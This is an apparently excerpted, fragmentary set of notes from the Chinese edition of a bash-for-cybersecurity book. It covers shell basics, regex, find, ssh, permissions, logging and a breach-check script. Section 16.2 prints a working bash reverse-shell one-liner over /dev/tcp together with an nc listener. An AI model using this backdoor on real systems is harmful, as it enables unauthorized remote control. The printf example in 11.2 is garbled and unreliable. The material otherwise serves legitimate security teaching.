## bash网络安全运维
> 保罗·特龙科恩 卡尔·阿尔宾

### 译者序

作为最常用的shell之一，bash自1989年正式发布以来，广泛应用于多种操作系统，众多Linux发行版和Solaris等系统将其作为默认使用的shell, 

而本书则是为数不多的结合网络安全运维介绍bash的技术书籍之一，书中从攻击、防御和分析三个场景介绍了bash的用法，不仅阐述了技术原理，也提供了具体的代码实例，每章末还提供了练习题以加深读者的理解。

### 1.5 命令行基础

如果你有一个名为handywork的程序，它从stdin读取输入并将结果写入stdout，你可以简单地更改它的行为如下所示：
￼
handywork < data.in > results.out

￼
handywork < data.in > results.out 2>&1
这意味着将stderr（2）发送到与文件描述符1（&1）相同的位置。注意，如果没有&符号，错误消息将被发送到一个名为1的文件。这种stdout和stderr的结合是如此常见，以至于有一个有用的缩写符号：

如果希望脚本具有更好的移植性，可以使用以下方法：
￼
#! /usr/bin/env bash
它使用env命令来查找bash的位置，并被认为是解决可移植性问题的标准方法。同样地，它假定env命令可以在/usr/bin中找到。

### 2.2 变量

你还可以使用$()存储shell命令的输出，如下所示：
￼
CMDOUT=$(pwd)

### 2.4 条件语句

使用0表示真，使用非零表示假，这与许多编程语言（如C++、Java、Python等）完全相反。但是对于bash是有意义的，因为一个失败的程序应该返回一个错误代码（解释它是如何失败的），而一个成功的程序应该没有错误代码，即0。这反映了这样一个事实：如果成功，许多操作系统调用返回0；如果发生错误，返回-1（或其他非零值）。但是在bash中，对于双括号内的值有一个例外（稍后将详细介绍）。

bash甚至可以以类似的方式处理命令管道：
￼
if ls | grep pdf￼
then￼

如果你想对小于号进行数值比较，请使用双圆括号结构，它假定所有变量都是数值的，并将按这样的方式计算它们。空变量或未设置变量的值为0。在圆括号内，除了位置参数$1和$2（以免与常量1和2混淆）之外，不需要$运算符来检索值。
￼
if (( VAL < 12 ))￼
then￼
    echo "value $VAL is too small"￼

当使用&&或||时，如果希望then子句中有多个操作，则需要对多个语句进行分组。例如：
￼
[[ -d $DIR ]] || echo "error: no such directory: $DIR" ; exit
无论$DIR是否是一个目录，它都将始终退出。
你可能想要的是：
￼
[[  -d  $DIR  ]]  ||  {  echo  "error:  no  such  directory:  $DIR" ；exit ; }
这里，大括号将把两个语句组合在一起。

### 2.5 循环

大括号可用于生成数字序列（或字符序列）{first..last..step}，其中．.step可以是正的也可以是负的，但都是可选的。在bash的最新版本中，前导0将数值用零填充到相同的宽度。例如，序列{090..104..2}将以步长2从090扩展到104，所有值都用0进行填充，保证每个值的宽度为3位。

### 2.6 函数

关于bash函数，有几个重要的注意事项：
· 除非在函数中使用local内建指令进行声明，否则变量的作用域是全局的。一个设置了变量i并且在循环中针对i值进行自动增长的for循环，可能会把代码中其他地方设置的变量i的值弄乱。

### 2.7 bash中的模式匹配

模式匹配中的另一个特殊字符是问号（?），它匹配单个字符。例如，source.？将匹配source.c或source.o但不能匹配source.py或source.cpp。

删除它时，像这样删除它：rm /tmp/\*.out，使用反斜杠告诉shell不要使用星号匹配模式。

· 在引号内（双引号或单引号）将不会进行模式匹配，所以如果你的脚本是echo data > "/tmp/*.out"，它将创建一个名为/tmp/*.out的文件（我们建议你尽量不要这样做）。

### 2.9 总结

它有它的优点，比如容易调用其他程序或连接其他一系列程序。但是，它也有它的弱点：它没有浮点运算或者对复杂数据结构的更多的支持（尽管有一些）。

### 3.1 使用的命令

3）使用名为egrep的命令，这是一个简单地以grep -E形式调用grep的脚本，这样你就不必再调用grep了。

### 3.2 正则表达式元字符

“.”元字符
在正则表达式中，句点（.）表示一个通配符。它将匹配除换行符以外的任何单个字符。

3.2.5 分组
我们可以用括号对字符分组。除此之外，还允许将括号内出现的字符视为一个单独的项，以便以后引用。下面是一个分组的例子：

### 5.2 收集系统信息

在远程系统上运行命令并将输出重定向到本地系统上的文件，请执行以下操作：
￼
ssh myserver ps > /tmp/ps.out
要在远程系统上运行命令并将输出重定向到远程系统上的文件，请执行以下操作：
￼
ssh myserver ps \> /tmp/ps.out

此外，你可以使用驻留在本地系统中的脚本，并使用SSH在远程系统上运行它们。你可以使用以下命令远程运行osdetect.sh脚本：
￼
ssh myserver bash < ./osdetect.sh
这将在远程系统上运行bash命令，但是直接从本地系统将osdetect.sh脚本的行传递给它。

￼
tar -czf ${HOSTNAME}_logs.tar.gz /var/log/
选项-c用于创建存档文件，-z用于压缩文件，-f用于指定输出文件的名称。HOSTNAME变量是一个bash变量，由shell自动设置为当前主机的名称。

用于替换的语法通常是${VAR/old/new}，即在VAR对应的字符串中用new替换old。在${VAR//old/new}中使用双斜杠是为了将VAR字符串中所有的old都替换成new，而不仅仅是第一个。

### 5.3 搜索文件系统

可以使用-iname选项而不是-name来使搜索不区分大小写。

find命令能够为找到的每个文件运行指定的命令。为此，你可以在指定搜索条件后使用exec选项。exec使用找到的文件的路径名替换任何花括号（{}）。用分号终止命令表达式：

在/home目录和子目录中搜索大于5GB的文件：
￼
find /home -size +5G

find / -type f -exec ls -s '{}' \; | sort -n -r | head -5
首先，我们使用find / -type f列出根目录中和根目录下的所有文件。每个文件被传递到ls -s，并以块（而不是字节）的形式标识其大小。然后将列表按照文件大小从大到小排序，并使用head显示前五名。要查看系统中最小的文件，可以使用tail替代head，或者从sort中删除倒序选项（-r）。


￼在shell中，你可以使用！！表示最后执行的命令。你可以再次使用它来执行命令

你还可以直接使用ls命令来查找最大的文件，而完全不用find命令，这将大大提高效率。要做到这一点，只需为ls添加-R选项，这将导致它递归地列出指定目录下的文件：
￼
ls / -R -s | sort -n -r | head -5

### 6.1 使用的命令

awk不仅是一个命令，而且实际上是一种用于处理文本的编程语言。

6.1.2 join
join组合两个文件中有公共字段的行。为了使join正常工作，输入的文件必须事先排好序。
常见的命令选项

### 6.4 处理JSON

同样，-o选项只用于返回与模式匹配的字符，而不是返回文件的整行。

### 11.2 逆向工程

你可以使用printf通过格式字符串“%!d(MISSING)”将其转换为十进制：
￼
$ printf "%!d(MISSING)" 0x41￼
@@@￼
65

### 14.1 使用的命令

eval命令执行在当前shell中传入它的参数。例如，你可以以字符串格式向eval提供shell命令和参数，它会像执行shell命令一样执行它。这对于在脚本中动态构建shell命令特别有用。

### 第16章 建立立足点

在开发目标系统并获得访问权限之后，下一步是使用远程访问工具建立立足点。远程访问工具是所有渗透测试的关键组件，因为它允许你在系统上远程执行命令，并随着时间的推移维护对系统的访问。

### 16.1 使用的命令

监听端口8080上的传入连接：
￼
$ nc -l -v -n -p 8080￼

### 16.2 单行后门

/bin/bash -i < /dev/tcp/192.168.10.5/8080 1>&0 2>&0
虽然只有一行，但是这里发生了很多事情，所以让我们把它分解一下：
￼
/bin/bash -i
这将调用bash的一个新实例，并以交互模式运行它。

这将在端口8080上创建从192.168.10.5到攻击者系统的TCP连接，并将其作为输入重定向到新的bash实例。用攻击者系统的IP地址和端口替换这里的IP地址和端口

在攻击者系统上，你需要有来自目标的连接的服务器端口列表。为此，可以使用nc：
￼
$ nc -l -v -p 8080￼

### 17.1 使用的命令

-R￼
    递归地更改文件和目录。
17.1.2 chown

usermod命令用于修改用户设置，比如Linux中的主目录位置和组。
常见的命令选项
-d￼
    设置用户的主目录。-g￼
    设置用户组。

### 17.4 进行批量更改

find . -type f -user jsmith -exec chown mwilson '{}' \；

查找当前工作目录中包含单词secret的所有文件，并使其只能由所有者访问：
￼
find . -type f -name '*secret*' -exec chmod 600 '{}' \；

### 17.5 总结

创建和管理用户和组是维护系统安全性的一个关键方面。尽量遵循最小特权原则，只向用户分配执行其分配的任务所必需的权限。

### 18.3 编写Linux日志

logger命令用于将事件写入Linux系统日志。这些事件通常存储在/var/log/messages中，但这也有可能因Linux发行版的不同而有所不同。
向日志中写

### 19.1 使用的命令

ping命令使用网际控制消息协议（Internet Control and Messaging Protocol, ICMP）来确定远程系统是否可用。

ICMP流量可以被网络防火墙和其他设备阻塞。如果你ping一个设备，它没有响应，这并不意味着该设备不可用，它可能只是过滤了ICMP包

### 20.1 使用的命令

列出系统上安装的所有软件包：
￼
apt list--installed

### 第22章 工具：账户审核

我们使用网站“Have I Been Pwned? ”来审核用户账户，要求如下：
· 查询haveibeenpwned.com以检查密码是否与已知的泄露事件有关。
· 查询haveibeenpwned.com以检查电子邮件地址是否与已知的泄露事件有关。

### 22.3 检查泄露的电子邮件地址

f (( "$#" == 0 ))  ❶￼
then￼
        printf 'Enter email address: '￼
        read emailin￼
else￼
        emailin="$1"￼
fi￼

### 第23章 结论

命令行及其相关的脚本功能和工具对于网络安全运维来说是非常宝贵的资源。它可以被比作一个可无限重构的多重工具。通过将一系列经过深思熟虑的命令组合在一起，你可以创建一个执行极其复杂功能的单行脚本。对于更多的功能，你可以创建多行脚本。

### 关于作者

他曾担任过各种角色，包括漏洞分析师、软件开发人员、渗透测试人员和大学教授。你可以在LinkedIn找到他。

### 封面介绍

O'Reilly封面上的许多动物都濒临灭绝，它们对世界都很重要。想了解更多如何提供帮助的信息，